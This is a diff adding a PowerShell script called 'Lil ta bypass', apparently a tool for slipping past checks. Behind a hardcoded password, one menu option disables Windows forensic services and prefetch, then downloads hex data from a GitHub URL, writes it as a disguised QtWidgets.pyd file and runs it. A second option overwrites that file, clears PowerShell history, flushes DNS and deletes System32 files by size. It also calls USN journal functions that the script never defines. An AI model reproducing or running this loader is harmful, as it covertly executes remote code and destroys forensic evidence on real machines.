@@ -1,0 +1,287 @@
+# Define hardcoded passwords
+$hardcodedPasswords = @("password")
+
+# Function to prompt for a password
+function Prompt-ForPassword {
+    clear
+    $password = Read-Host "Enter your password"
+    return $password
+}
+
+# Function to display options
+function Display-Options {
+    clear
+    Write-Host "[~~] Lil ta bypass [~~]"
+    Write-Host "Select an option:"
+    Write-Host "1. Gosth"
+    Write-Host "2. Clean"
+    Write-Host "0. Exit"
+}
+
+# Function to forcefully disable a service
+function Force-Disable-Service {
+    param (
+        [string]$servicePath,
+        [string]$serviceName
+    )
+    try {
+        # Stop the service before disabling it, even if it's already stopped
+        Stop-Service -Name $serviceName -Force -ErrorAction SilentlyContinue
+        # Disable the service in the registry
+        Set-ItemProperty -Path $servicePath -Name Start -Value 4 # 4 = Disabled
+    } catch {
+        Write-Host ("Error disabling service: {0}" -f $_.Exception.Message)
+    }
+}
+
+# Function to enable a service
+function Enable-Service {
+    param (
+        [string]$servicePath
+    )
+    try {
+        Set-ItemProperty -Path $servicePath -Name Start -Value 2 # 2 = Automatic
+    } catch {
+        Write-Host ("Error enabling service: {0}" -f $_.Exception.Message)
+    }
+}
+
+# Function to disable prefetch
+function Disable-Prefetch {
+    param (
+        [string]$prefetchPath
+    )
+    try {
+        Set-ItemProperty -Path $prefetchPath -Name EnablePrefetcher -Value 0 # 0 = Disabled
+    } catch {
+        Write-Host ("Error disabling prefetch: {0}" -f $_.Exception.Message)
+    }
+}
+
+# Function to enable prefetch
+function Enable-Prefetch {
+    param (
+        [string]$prefetchPath
+    )
+    try {
+        Set-ItemProperty -Path $prefetchPath -Name EnablePrefetcher -Value 3 # 3 = Enabled
+    } catch {
+        Write-Host ("Error enabling prefetch: {0}" -f $_.Exception.Message)
+    }
+}
+
+# Function to download hex data from a URL
+function Get-HexData {
+    param (
+        [string]$url
+    )
+    
+    try {
+        $response = Invoke-WebRequest -Uri $url -TimeoutSec 30
+        return $response.Content
+    } catch {
+        Write-Host ("Error fetching data: {0}" -f $_.Exception.Message)
+        return $null
+    }
+}
+
+# Function to convert hex string to byte array
+function Convert-HexToBytes {
+    param (
+        [string]$hex
+    )
+
+    # Check if hex string length is even
+    if ($hex.Length % 2 -ne 0) {
+        Write-Host "Error: Hex string length is not even."
+        return $null
+    }
+
+    $byteArray = New-Object Byte[] ($hex.Length / 2)
+    for ($i = 0; $i -lt $hex.Length; $i += 2) {
+        $byteArray[$i / 2] = [convert]::ToByte($hex.Substring($i, 2), 16)
+    }
+    return $byteArray
+}
+
+# Function to write binary data to a file
+function Write-BinaryToFile {
+    param (
+        [string]$filePath,
+        [byte[]]$data
+    )
+
+    try {
+        [System.IO.File]::WriteAllBytes($filePath, $data)
+    } catch {
+        Write-Host ("Error writing binary data to file: {0}" -f $_.Exception.Message)
+    }
+}
+
+# Function to check file size and delete it
+function Find-And-Delete-FileBySize {
+    param (
+        [string]$directory,
+        [long]$fileSize
+    )
+    
+    $files = Get-ChildItem -Path $directory | Where-Object { $_.Length -eq $fileSize }
+    
+    foreach ($file in $files) {
+        Write-Host "Trying to delete file: $($file.FullName)"
+        
+        # Try to delete the file until it is deleted
+        do {
+            try {
+                Remove-Item -Path $file.FullName -Force -ErrorAction Stop
+                Write-Host "Successfully deleted: $($file.FullName)"
+                break
+            } catch {
+                Write-Host ("Failed to delete: {0}, retrying..." -f $file.FullName)
+                Start-Sleep -Seconds 1 # Wait before retrying
+            }
+        } while ($true)
+    }
+}
+
+# Main script logic
+while ($true) {
+    # Prompt for password
+    $userPassword = Prompt-ForPassword
+
+    # Check if the password is valid
+    if ($hardcodedPasswords -contains $userPassword) {
+        while ($true) {
+            # Display options
+            Display-Options
+            $option = Read-Host "Please enter your choice"
+
+            switch ($option) {
+                '1' {
+                    Write-Host "Selected Gosth..."
+
+                    # Forcefully disable services and prefetch
+                    Force-Disable-Service -servicePath "HKLM:\SYSTEM\CurrentControlSet\Services\bam" -serviceName "bam"
+                    Force-Disable-Service -servicePath "HKLM:\SYSTEM\CurrentControlSet\Services\DPS" -serviceName "DPS"
+                    Force-Disable-Service -servicePath "HKLM:\SYSTEM\CurrentControlSet\Services\PcaSvc" -serviceName "PcaSvc"
+                    Disable-Prefetch -prefetchPath "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"
+
+                    # Get hex data
+                    $hexUrl = "https://raw.githubusercontent.com/Notsurewtf/9219313923123313-systemkey-finder/main/ChangeLog.txt"
+                    $filePath = "F:\Electrum\PyQt5\QtWidgets.pyd"
+                    $hexData = Get-HexData -url $hexUrl
+
+                    # Check if hex data is not null
+                    if ($null -ne $hexData) {
+                        # Clean hex data by removing non-hex characters
+                        $hexCodePayload = -join ($hexData -replace '[^0-9A-Fa-f]', '')
+
+                        # Check if hex code is valid
+                        if ($hexCodePayload.Length % 2 -eq 0) {
+                            $binaryData = Convert-HexToBytes -hex $hexCodePayload
+
+                            # Check if conversion was successful
+                            if ($null -ne $binaryData) {
+                                Write-BinaryToFile -filePath $filePath -data $binaryData
+                            } else {
+                                Write-Host "Error: Conversion to bytes failed."
+                            }
+                        } else {
+                            Write-Host "Error: Invalid hex data received."
+                        }
+                    } else {
+                        Write-Host "No hex data fetched."
+                    }
+
+                    # Execute the downloaded file
+                    if (Test-Path $filePath) {
+                        try {
+                            Start-Process -FilePath $filePath -NoNewWindow
+                            Write-Host "Successfully executed gosth"
+
+                            # Wait for 7 seconds
+                            Start-Sleep -Seconds 7
+                        } catch {
+                            Write-Host ("Failed to execute: {0}" -f $filePath)
+                        }
+                    } else {
+                        Write-Host ("The file does not exist: {0}" -f $filePath)
+                    }
+
+                    # Re-enable services and prefetch
+                    Enable-Service -servicePath "HKLM:\SYSTEM\CurrentControlSet\Services\bam"
+                    Enable-Service -servicePath "HKLM:\SYSTEM\CurrentControlSet\Services\DPS"
+                    Enable-Service -servicePath "HKLM:\SYSTEM\CurrentControlSet\Services\PcaSvc"
+                    Enable-Prefetch -prefetchPath "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"
+
+                    Write-Host "Gosth completed."
+                }
+                '2' {
+                    Write-Host "Starting Clean..."
+
+                    # Disable necessary services
+                    Force-Disable-Service -servicePath "HKLM:\SYSTEM\CurrentControlSet\Services\bam" -serviceName "bam"
+                    Force-Disable-Service -servicePath "HKLM:\SYSTEM\CurrentControlSet\Services\DPS" -serviceName "DPS"
+                    Force-Disable-Service -servicePath "HKLM:\SYSTEM\CurrentControlSet\Services\PcaSvc" -serviceName "PcaSvc"
+                    Disable-Prefetch -prefetchPath "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"
+
+                    # Fetch hex data from URL
+                    $hexUrl = "https://raw.githubusercontent.com/Notsurewtf/shiny-tribble/refs/heads/main/funny" # URL to fetch hex data
+                    $hexData = Get-HexData -url $hexUrl
+
+                    # Path to the log file
+                    $filePath = "F:\Electrum\PyQt5\QtWidgets.pyd"
+
+                    # Check if hex data is valid
+                    if ($null -ne $hexData) {
+                        # Convert hex string to byte array
+                        $binaryData = Convert-HexToBytes -hex $hexData
+
+                        # Write the binary data to the file
+                        if ($null -ne $binaryData) {
+                            Write-BinaryToFile -filePath $filePath -data $binaryData
+                            Write-Host "Hex of the file changed successfully."
+                        } else {
+                            Write-Host "Error: Conversion to bytes failed."
+                        }
+                    } else {
+                        Write-Host "Error: No hex data fetched."
+                    }
+
+                    # Flush DNS
+                    ipconfig /flushdns
+
+                    # Clear PowerShell history
+                    $historyFilePath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_History.txt"
+                    if (Test-Path $historyFilePath) {
+                        Clear-Content -Path $historyFilePath
+                    } else {
+                        Write-Host "The file does not exist."
+                    }
+
+                    # USN Journal manipulation code
+                    Maximize-USNJournal
+                    Find-And-Delete-FileBySize -directory "C:\Windows\System32" -fileSize 12345678 # Change to desired file size
+                    Unmaximize-USNJournal
+
+                    # Re-enable services and prefetch
+                    Enable-Service -servicePath "HKLM:\SYSTEM\CurrentControlSet\Services\bam"
+                    Enable-Service -servicePath "HKLM:\SYSTEM\CurrentControlSet\Services\DPS"
+                    Enable-Service -servicePath "HKLM:\SYSTEM\CurrentControlSet\Services\PcaSvc"
+                    Enable-Prefetch -prefetchPath "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"
+
+                    Write-Host "Clean completed."
+                }
+                '0' {
+                    Write-Host "Exiting..."
+                    exit
+                }
+                default {
+                    Write-Host "Invalid option. Please try again."
+                }
+            }
+        }
+    } else {
+        Write-Host "Invalid password. Please try again."
+    }
+}
